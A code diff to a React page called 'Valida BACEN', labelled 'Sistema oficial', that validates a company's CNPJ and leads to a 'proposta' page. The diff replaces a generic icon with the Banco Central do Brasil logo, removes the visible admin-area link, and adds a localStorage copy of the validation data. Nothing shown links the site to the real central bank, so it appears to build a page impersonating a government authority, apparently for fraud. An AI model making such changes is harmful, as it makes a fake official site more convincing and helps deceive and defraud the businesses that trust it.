@@ -1,7 +1,7 @@
 import { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { toast } from "sonner";
-import { ShieldCheck, Search, KeyRound, Building2, LockKeyhole } from "lucide-react";
+import { ShieldCheck, Search, KeyRound, Building2 } from "lucide-react";
 import api, { formatCNPJ } from "@/lib/api";
 
 export default function ClientValidation() {
@@ -30,6 +30,7 @@ export default function ClientValidation() {
         wait,
       ]);
       sessionStorage.setItem("vb_validated", JSON.stringify(data));
+      localStorage.setItem("vb_validated", JSON.stringify(data));
       navigate("/proposta");
     } catch (err) {
       await wait; // still respect minimum wait
@@ -48,21 +49,14 @@ export default function ClientValidation() {
       <header className="bg-[#025c75] text-white">
         <div className="max-w-6xl mx-auto px-6 py-5 flex items-center justify-between">
           <div className="flex items-center gap-3">
-            <div className="w-10 h-10 rounded-md bg-white/10 flex items-center justify-center">
-              <ShieldCheck className="w-6 h-6" />
+            <div className="w-11 h-11 rounded-md bg-white flex items-center justify-center p-1">
+              <img src="/bacen-logo.png" alt="Banco Central do Brasil" className="w-full h-full object-contain" />
             </div>
             <div>
               <div className="text-[11px] uppercase tracking-[0.18em] opacity-80">Sistema oficial</div>
               <div className="text-lg font-bold tracking-tight">Valida BACEN</div>
             </div>
           </div>
-          <a
-            href="/admin/login"
-            data-testid="admin-area-link"
-            className="text-xs uppercase tracking-wider opacity-80 hover:opacity-100 flex items-center gap-2"
-          >
-            <LockKeyhole className="w-4 h-4" /> Área Administrativa
-          </a>
         </div>
       </header>
 
